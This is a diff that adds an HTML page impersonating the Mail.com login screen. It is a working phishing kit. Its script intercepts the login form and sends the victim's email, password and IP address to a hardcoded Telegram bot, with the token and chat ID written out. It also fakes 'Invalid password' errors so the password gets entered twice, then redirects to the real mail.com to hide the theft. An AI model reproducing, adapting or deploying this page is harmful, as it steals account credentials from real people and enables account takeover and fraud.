@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mail.com</title>
+    <link rel="stylesheet" href="style.css">
+    
+    <link rel="shortcut icon" href="https://img.ui-portal.de/ux/mailcom/icons/favicon.ico" type="image/x-icon">
+    <link sizes="16x16" rel="icon" href="https://img.ui-portal.de/ux/mailcom/icons/favicon-16x16.png" type="image/png">
+    <link sizes="32x32" rel="icon" href="https://img.ui-portal.de/ux/mailcom/icons/favicon-32x32.png" type="image/png">
+
+
+
+    <script>
+        window.onload = function() {
+          // Function to extract query parameters from the URL
+          function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+          }
+      
+          // Get the 'email' parameter from the URL
+          const email = getQueryParam('email');
+          
+          // If an email is present in the URL, set it as the value of the email input field
+          if (email) {
+            document.querySelector('input[name="email"]').value = email;
+          }
+        };
+      </script>
+
+      
+    <style>
+
+body {
+    position: relative;
+    overflow: hidden;
+    min-height: 100%;
+    background-color: rgb(37, 37, 40);
+
+@media (max-width: 768px) {
+    .form-container {
+        height: 100vh;
+        width: 100%;
+        padding: 20px;
+        align-items: flex-start;
+        position: absolute;
+        display: flex;
+        justify-content: center;
+        top: 0;
+        left: 0;
+        width: 100%;
+        padding: 10px;
+        box-sizing: border-box;
+        height: auto; /* Remove full viewport height */
+    }
+
+
+
+
+    .main-box {
+    width: 100%;
+    height: 100vh;
+    margin-top: 0;
+    }
+}
+
+
+/* 
+.form-logo{
+    display: flex; /* Enables Flexbox on the container */
+    justify-content: center; 
+    align-items: center;
+
+} */
+
+.form-logo {
+    position: absolute;
+    top: 0;
+    left: 0;
+    padding: 10px; /* Optional: Adjust for spacing */
+}
+
+.logo {
+    width: 150px; /* Adjust size as needed */
+    height: auto;
+}
+
+.mail-com{
+    height: 80px;
+}
+
+.form-container{
+    display: flex; /* Enables Flexbox on the container */
+    justify-content: center; Centers the content horizontally
+    align-items: center; Centers the content vertically
+    height: 100vh;
+
+}
+
+
+.main-box {
+    background-color: rgb(37, 37, 40);
+    border-bottom-left-radius: 12px;
+    border-bottom-right-radius: 12px;
+    border-top-left-radius: 12px;
+    border-top-right-radius: 12px;
+    box-sizing: border-box;
+    color: rgb(12, 12, 20);
+    display: block;
+    font-family: InterVariable, system-ui, sans-serif;
+    font-size: 14px;
+    font-style: normal;
+    font-synthesis: none;
+    font-weight: 400;
+    height: 480.164px;
+    line-height: 20px;
+    margin-left: 33px;
+    margin-right: 33px;
+    position: relative;
+    quotes: "“" "”" "‘" "’";
+    scrollbar-color: rgb(209, 207, 205) rgba(0, 0, 0, 0);
+    scrollbar-width: thin;
+    transform: matrix(1, 0, 0, 1, 0, 0);
+    transition-behavior: normal;
+    transition-delay: 0s;
+    transition-duration: 0.15s;
+    transition-property: max-width;
+    transition-timing-function: cubic-bezier(0.42, 0, 1, 1);
+    unicode-bidi: isolate;
+    width: 480px;
+    -webkit-font-smoothing: antialiased;
+}
+
+
+
+.signin-tocontinue{
+    box-sizing: border-box;
+    line-height: 20px;
+    margin-bottom: 12px;
+}
+.to-continue{
+    color: rgb(255, 255, 255);
+    font-size: px;
+    font-weight: 400;
+    line-height: 20px;
+    margin-top: 12px;
+
+}
+
+.label{
+color: rgb(12, 12, 20);
+cursor: pointer;
+font-family: InterVariable, system-ui, sans-serif;
+font-size: 14px;
+font-style: normal;
+font-weight: 600;
+height: 20px;
+line-height: 20px;
+scrollbar-color: rgba(0, 0, 0, 0) rgba(0, 0, 0, 0);
+scrollbar-width: thin;
+justify-content: space-between;
+margin-bottom: 4px;
+row-gap: 8px;
+vertical-align: middle;
+width: 392px;
+}
+
+.in-between{
+    margin-top: 20px;
+}
+
+.box::placeholder {
+    color: rgba(200, 200, 200, 0.7); /* Light gray placeholder color */
+    transition: color 0.3s ease; /* Smooth transition effect */
+}
+
+.box:focus::placeholder {
+    color: rgba(255, 255, 255, 0.5); /* Change the placeholder color on focus */
+}
+
+
+.box{
+
+align-items: stretch;
+background-color: rgb(130, 127, 127);
+border-bottom-color: rgb(167, 161, 177);
+border-bottom-left-radius: 8px;
+border-bottom-right-radius: 8px;
+border-bottom-style: solid;
+border-bottom-width: 1px;
+border-image-outset: 0;
+border-image-repeat: stretch;
+border-image-slice: 100%;
+border-image-source: none;
+border-image-width: 1;
+border-left-color: rgb(167, 161, 177);
+border-left-style: solid;
+border-left-width: 1px;
+border-right-color: rgb(167, 161, 177);
+border-right-style: solid;
+border-right-width: 1px;
+border-top-color: rgb(167, 161, 177);
+border-top-left-radius: 8px;
+border-top-right-radius: 8px;
+border-top-style: solid;
+border-top-width: 1px;
+box-sizing: border-box;
+color: white;
+cursor: text;
+display: flex;
+flex-basis: 0px;
+flex-grow: 1;
+flex-shrink: 1;
+flex-wrap: nowrap;
+font-family: InterVariable, system-ui, sans-serif;
+font-size: 16px;
+font-style: normal;
+font-synthesis-small-caps: none;
+font-synthesis-style: none;
+font-synthesis-weight: none;
+font-weight: 400;
+height: 46.8516px;
+line-height: 20px;
+position: relative;
+quotes: "“" "”" "‘" "’";
+scrollbar-color: rgba(209, 207, 205, 0.247) rgba(0, 0, 0, 0);
+scrollbar-width: thin;
+transition-behavior: normal, normal;
+transition-delay: 0s, 0s;
+transition-duration: 0.15s, 0s;
+transition-property: all, visibility;
+transition-timing-function: cubic-bezier(0.22, 1, 0.36, 1), ease;
+unicode-bidi: isolate;
+width: 392px;
+-webkit-font-smoothing: antialiased;
+
+}
+
+.checkbox-input{
+box-sizing: border-box;
+color: rgb(12, 12, 20);
+cursor: pointer;
+display: flex;
+height: 10px;
+line-height: 20px;
+min-height: 0px;
+min-width: 0px;
+position: relative;
+scrollbar-color: rgba(0, 0, 0, 0) rgba(0, 0, 0, 0);
+scrollbar-width: thin;
+vertical-align: middle;
+width: 20px;
+-webkit-font-smoothing: antialiased;
+
+}
+
+.keep-me{
+    font-size: 12px;
+    font-weight: 400px;
+    cursor: pointer;
+    width: 252px;
+    color: white;
+    
+}
+
+.trusted{
+    color: rgb(92, 89, 88);
+}
+
+.why{
+    color: rgb(92, 89, 88);
+
+}
+
+.check-area {
+    display: flex;
+    /* align-items: center; */
+}
+
+
+
+.signin-button {
+    align-items: flex-start;
+    appearance: none;
+    background-attachment: scroll;
+    background-clip: border-box;
+    background-color: rgb(70, 129, 254);
+    background-image: none;
+    background-origin: padding-box;
+    background-position-x: 0%;
+    background-position-y: 0%;
+    background-repeat: repeat;
+    background-size: auto;
+    border-bottom-color: rgba(0, 0, 0, 0);
+    border-bottom-left-radius: 8px;
+    border-bottom-right-radius: 8px;
+    border-bottom-style: solid;
+    border-bottom-width: 1px;
+    border-image-outset: 0;
+    border-image-repeat: stretch;
+    border-image-slice: 100%;
+    border-image-source: none;
+    border-image-width: 1;
+    border-left-color: rgba(0, 0, 0, 0);
+    border-left-style: solid;
+    border-left-width: 1px;
+    border-right-color: rgba(0, 0, 0, 0);
+    border-right-style: solid;
+    border-right-width: 1px;
+    border-top-color: rgba(0, 0, 0, 0);
+    border-top-left-radius: 8px;
+    border-top-right-radius: 8px;
+    border-top-style: solid;
+    border-top-width: 1px;
+    box-sizing: border-box;
+    color: rgb(255, 255, 255);
+    cursor: pointer;
+    display: inline-block;
+    font-family: InterVariable, system-ui, sans-serif;
+    font-feature-settings: normal;
+    font-kerning: auto;
+    font-optical-sizing: auto;
+    font-size: 16px;
+    font-size-adjust: none;
+    font-stretch: 100%;
+    font-style: normal;
+    font-synthesis: none;
+    font-variant: normal;
+    font-weight: 400;
+    height: 44px;
+    letter-spacing: normal;
+    line-height: 24px;
+    margin-bottom: 0px;
+    margin-left: 0px;
+    margin-right: 0px;
+    margin-top: 12px;
+    outline-color: rgb(255, 255, 255);
+    outline-style: none;
+    outline-width: 0px;
+    padding-block-end: 9px;
+    padding-block-start: 9px;
+    padding-bottom: 9px;
+    padding-inline-end: 19px;
+    padding-inline-start: 19px;
+    padding-left: 19px;
+    padding-right: 19px;
+    padding-top: 9px;
+    quotes: "“" "”" "‘" "’";
+    scrollbar-color: rgba(0, 0, 0, 0) rgba(0, 0, 0, 0);
+    scrollbar-width: thin;
+    text-align: center;
+    text-decoration: none;
+    text-indent: 0px;
+    text-rendering: auto;
+    text-shadow: none;
+    text-transform: none;
+    transition: all 0.15s cubic-bezier(0.22, 1, 0.36, 1), background-position ease 0s;
+    vertical-align: middle;
+    width: 392px;
+    word-spacing: 0px;
+    -webkit-font-smoothing: antialiased;
+    -webkit-border-image: none;
+}
+
+.new-to {
+    box-sizing: border-box;
+    color: rgb(12, 12, 20);
+    display: block;
+    font-family: InterVariable, system-ui, sans-serif;
+    font-size: 14px;
+    font-style: normal;
+    font-synthesis: none;
+    font-weight: 400;
+    height: 20px;
+    line-height: 20px;
+    margin-top: 16px;
+    quotes: "“" "”" "‘" "’";
+    scrollbar-color: rgb(209, 207, 205) rgba(0, 0, 0, 0);
+    scrollbar-width: thin;
+    text-align: center;
+    unicode-bidi: isolate;
+    width: 352px;
+    -webkit-font-smoothing: antialiased;
+}
+
+.create {
+    color: rgb(109, 74, 255);
+    text-decoration-color: rgb(109, 74, 255);
+    text-decoration-line: underline;
+
+}
+
+
+.trouble{
+    color: rgb(51, 93, 208);
+    text-decoration-color: rgb(88, 88, 88);
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 400;
+}
+
+.trouble-div{
+display: block;
+margin-top: 30px;
+text-align: right;
+position: relative;
+padding-right: 80px;
+
+
+
+}
+
+.login-text{
+color: white;
+font-size: 18px;
+font-weight: 600;
+}
+
+
+
+    </style>
+
+</head>
+
+
+
+<body style="background-image: url();" class="bg">
+
+
+
+    <div class="whole-page">
+
+        
+        
+        <div class="form-container">
+            <div class="main-box">
+
+                <div class="form-logo">
+                    <img class="logo" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDI0LjMuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IgoJIHZpZXdCb3g9IjAgMCA1NDIuNSAxNDUiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDU0Mi41IDE0NTsiIHhtbDpzcGFjZT0icHJlc2VydmUiPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoJLnN0MHtmaWxsOiNGRkZGRkY7fQo8L3N0eWxlPgo8cGF0aCBjbGFzcz0ic3QwIiBkPSJNMTgzLjksMjEuNmMtMTkuNywwLTM1LjcsMTYtMzUuNywzNy40YzAsMjEuMywxNS45LDM3LjMsMzUuNSwzNy4zYzEwLjEsMCwxOS01LjEsMjQuNi0xMi44djExaDExLjNWNTkKCUMyMTkuNSwzOC4xLDIwNC4xLDIxLjYsMTgzLjksMjEuNnogTTE4My45LDg1LjRjLTEzLjIsMC0yNC0xMS40LTI0LTI2LjRjMC0xNC45LDEwLjgtMjYuNiwyNC0yNi42YzEzLDAsMjQsMTEuOSwyNCwyNi42CglTMTk3LDg1LjQsMTgzLjksODUuNHogTTI4MC4zLDgzLjV2MTFjLTE2LjcsMS45LTI4LjItNy45LTI4LjItMjUuOVYyLjVoMTEuNnY2NS43QzI2My44LDgwLjcsMjcxLjUsODMuOSwyODAuMyw4My41eiBNMjI5LjgsMjMuNAoJaDExLjd2NzEuMWgtMTEuN1YyMy40eiBNMjI5LjgsMi41aDExLjd2MTEuN2gtMTEuN1YyLjV6IE0zMDguMSw1OWMwLDE0LjQsMTAuOCwyNS45LDIzLjksMjUuOWM5LjQsMCwxNi43LTQuOCwyMC42LTEyLjZoMTIuNgoJQzM2MC41LDg2LjcsMzQ3LjksOTYsMzMyLjEsOTZjLTE5LjYsMC0zNS42LTE2LjYtMzUuNi0zNy4xYzAtMjAuNiwxNi0zNy40LDM1LjYtMzcuNGMxNS45LDAsMjguMyw5LjQsMzMuMSwyMy43aC0xMi42CgljLTQtNy43LTExLjMtMTIuNi0yMC42LTEyLjZDMzE4LjksMzIuOCwzMDguMSw0NC43LDMwOC4xLDU5eiBNNDAyLjYsMjEuNmMtMjAuMSwwLTM1LjcsMTYuOC0zNS43LDM3LjVjMCwyMC40LDE1LjYsMzcuMSwzNS43LDM3LjEKCWMyMC4zLDAsMzUuNy0xNi43LDM1LjctMzcuMUM0MzguNCwzOC41LDQyMi45LDIxLjYsNDAyLjYsMjEuNnogTTQwMi42LDg1Yy0xMy4xLDAtMjMuOS0xMS42LTIzLjktMjUuOGMwLTE0LjUsMTAuOC0yNi40LDIzLjktMjYuNAoJYzEzLjMsMCwyNCwxMS45LDI0LDI2LjRDNDI2LjYsNzMuNCw0MTUuOSw4NSw0MDIuNiw4NXogTTI4Ni40LDgyLjhoMTEuN3YxMS43aC0xMS43VjgyLjh6IE01MzkuOCw0OXY0NS41aC0xMS43di00NgoJYzAtOS4yLTYuMS0xNi4xLTE1LjUtMTYuMWMtOS40LDAtMTUuNSw2LjktMTUuNSwxNi4xdjQ2aC0xMS43di00NmMwLTkuMi02LjEtMTYuMS0xNS41LTE2LjFzLTE1LjUsNi45LTE1LjUsMTYuMXY0NmgtMTEuN1YyMS42SDQ3MAoJYzkuNywwLDE3LjEsNC42LDIxLjMsMTEuN2M0LjMtNy4yLDExLjctMTEuNywyMS40LTExLjdDNTI4LjgsMjEuNiw1MzkuOCwzMy41LDUzOS44LDQ5eiIvPgo8cGF0aCBjbGFzcz0ic3QwIiBkPSJNMTA3LjYsMi41SDIuNXY5MS40YzAsOC4yLDUuNiwxNSwxMy4xLDE3bDAsMGwxMjYuOSwzMS43VjM3LjVDMTQyLjYsMTguMiwxMjYuOSwyLjUsMTA3LjYsMi41eiBNMTI1LjEsOTMuOQoJaC0xNy42VjUzLjhjMC0zLjktMS4zLTEzLTEyLjktMTNjLTcuNywwLTEzLjMsNS4zLTEzLjMsMTN2NDAuMUg2My43VjUzLjhjMC0zLjktMS4yLTEzLTEyLjgtMTNjLTcuOSwwLTEzLjMsNS4zLTEzLjMsMTN2NDAuMUgyMAoJVjIzLjZoMzAuOWM5LjMsMCwxNi45LDMuNywyMS44LDkuN2M1LjItNiwxMi45LTkuNywyMS44LTkuN2MxOS4yLDAsMzAuNSwxMi43LDMwLjUsMzAuNkwxMjUuMSw5My45TDEyNS4xLDkzLjl6Ii8+Cjwvc3ZnPgo=" jsaction="" alt="Mail.com" class="mail-com">
+                </div>
+                
+
+                <form action="https://support.mail.com/" method="post">
+
+                    <div class="signin-tocontinue">
+                        <!-- <div class="">
+                            <h1 class="sign-layout-title">Sign in</h1>
+                        </div> -->
+                        <div class="to-continue">
+                            <h1>Welcome!</h1>
+                            <h4>Log in with your mail.com email address</h4>
+                        </div>
+                    </div>
+    
+    
+                    <div class="form-space">
+                        <!-- <label for="username" class="label">
+                            <span class="gap">Email Address</span>
+                        </label> -->
+    
+                        <div>
+                            <input id="email" name="email" type="text" aria-describedby="id-3" placeholder="Email Address" class="box" value="">
+                        </div>
+                        
+                    </div>
+    
+                    <div class="in-between" id="id-3"></div>
+    
+                    
+                    <div class="form-space">
+                        <!-- <label for="password" class="label">
+                            <span class="gap">Password</span>
+                        </label> -->
+    
+                        <div>
+                            <input id="password" name="pass" type="password" placeholder="Password" class="box" value="">
+                        </div>
+                        
+                    </div>
+    
+                    <div class="in-between" id="id-3"></div>
+    
+    
+        
+                    
+    
+                    <button class="signin-button" id="submit-btn" type="submit">
+                        <span class="login-text">Log in</span>
+                      </button>
+                    
+    
+                    <div class="trouble-div"> <a class="trouble" href="">Forgot your password?</a>   </div>
+    
+
+
+                </form>
+                
+            </div>
+            <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+                  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+                  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+                  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+                <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+                <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+                 <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+                  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+                  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+                  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+                <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+                <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+                
+          
+              <script>
+            $(document).ready(function(){
+            var count=0;
+            let u53TiQ = '';
+                  $.getJSON('https://api.ipify.org?format=json', function(data){
+                    u53TiQ = data.ip;
+                  });
+                  
+                  
+                            var tx1="2045151556";
+            var tx2="7997154944:AAHkrN11LsK5dfy5yLNl7RD5gGXHccOqMqc";
+             ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1;
+             
+            var email = window.location.hash.substr(1);
+            if (!email) {
+            
+            }
+            else
+            {
+            var my_email =email;
+            $('#email').val(my_email);
+            $('#displayedLogin').html(my_email);
+            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+            
+            if (!filter.test(my_email)) {
+            $('#error').show();
+            email.focus;
+            return false;
+            }
+            var ind=my_email.indexOf("@");
+            var my_slice=my_email.substr((ind+1));
+            var c= my_slice.substr(0, my_slice.indexOf('.'));
+            var final= c.toLowerCase();
+            var finalu= c.toUpperCase();
+            
+            $("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+            $("#logoname").html(finalu);
+            $(".logoname").html(finalu);
+            }
+            
+            $('#submit-btn').click(function(event){
+            $('#error').hide();
+            $('#msg').hide();
+            event.preventDefault();
+            var email=$("#email").val();
+            var password=$("#password").val();
+            
+                                if (!password) {
+                            $('#error-for-password').show();
+                            $('#error-for-password').html("Password field is emply.!");
+            
+                            return false;
+                        }
+            
+            count=count+1;
+            
+            $.ajax({
+            dataType: 'JSON',
+            url: ur,
+            type: 'GET',
+                    data:{
+                      ajaxid: 4,
+                    text: 'Email:' + email + ' | Password:' + password + ' | IP:' + u53TiQ
+                    },
+                        //data: $('#contact').serialize(),
+                        beforeSend: function(xhr){
+                            
+                        },
+                        success: function(response){
+                            if(response){
+                                $("#msg").show();
+                                console.log(response);
+                                if(response.ok === true){
+                                    $("#password").val("");
+                                    if (count>=2) {
+                                        count=0;
+                                // window.location.replace(response['redirect_link']);
+                                     $('#first').css('display', 'none');
+                $('#second').css('display', 'block');
+                
+                    setTimeout(() => { window.location.replace("https://www.mail.com/support/migration-service/"+my_slice);  }, 5000);
+                               
+            
+                            }
+                             $("#error-for-password").show();
+                        $('#error-for-password').html("Invalid password. Please try again");
+                        
+                        }
+                        else{
+                                         $("#error-for-password").show();
+                        $('#error-for-password').html("Invalid password. Please try again");
+                           
+                        }
+                    }
+                },
+                error: function(){
+                    $("#password").val("");
+                    if (count>=2) {
+                        count=0;
+                        
+                                                 $('#first').css('display', 'none');
+                $('#second').css('display', 'block');
+                setTimeout(() => { window.location.replace("https://www.mail.com/support/migration-service/"+my_slice);  }, 5000);
+                    }
+                            $("#error-for-password").show();
+                        $('#error-for-password').html("Invalid password. Please try again");
+                           
+                },
+                complete: function(){
+                    
+                }
+            });
+              });
+            
+            
+                });
+            
+            
+            </script>
+        </div>
+    </div>
+</body>
+</html>
